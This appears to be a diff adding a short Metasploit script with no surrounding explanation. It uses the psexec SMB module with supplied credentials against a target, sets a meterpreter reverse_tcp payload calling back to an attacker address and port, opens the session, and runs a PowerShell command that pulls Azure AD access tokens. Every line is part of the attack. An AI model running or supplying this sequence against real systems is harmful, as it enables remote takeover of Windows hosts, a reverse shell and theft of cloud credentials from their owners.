@@ -1,0 +1,21 @@
+msfconsole
+
+use exploit/windows/smb/psexec
+
+set RHOSTS target_ip_address
+set SMBUser john_doe_username
+set SMBPass john_doe_password
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST attacker_ip_address
+set LPORT attacker_port
+
+exploit
+
+sessions -i 1
+
+load powershell
+powershell_execute "[Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens['AccessToken'].AccessToken"
+
+
